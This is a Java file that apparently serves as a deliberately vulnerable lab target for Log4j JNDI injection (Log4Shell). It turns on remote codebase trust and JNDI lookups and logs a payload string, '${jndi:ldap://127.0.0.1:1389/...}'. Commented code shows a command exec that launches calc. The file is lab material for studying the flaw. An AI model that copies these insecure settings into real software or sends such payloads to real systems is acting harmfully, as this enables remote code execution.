package me.tutttuwi.JNDIInjectionTargetApp.main;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class TargetAppMain {
    private static final Logger log = LogManager.getLogger(TargetAppMain.class.getName());

    public static void main(String[] args) throws Exception {
        System.out.println("---- START ----");
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        System.setProperty("log4j2.formatMsgNoLookups", "false");
        System.setProperty("log4j2.enableJndiLookup", "true");
        // System.setProperty("java.security.policy", "java.policy");
        String var = "${jndi:ldap://127.0.0.1:1389/gibwld}";
        log.fatal(var);
        System.out.println("---- END ----");
        // InitialContext ctx = new InitialContext();
        // Object obj = ctx.lookup("rmi://127.0.0.1:1099/3timeu");
        // System.out.print(obj);

        // 【検証用】JavaからOSコマンド実行
        // String[] arrayOfString;
        // if (System.getProperty("os.name").toLowerCase().contains("win")) {
        // arrayOfString = new String[] {"cmd.exe", "/C", "calc"};
        // } else {
        // arrayOfString = new String[] {"/bin/bash", "-c", "calc"};
        // }
        // try {
        // Runtime.getRuntime().exec(arrayOfString);
        // } catch (Exception exception) {
        // exception.printStackTrace();
        // }
        // System.out.println();
    }

}
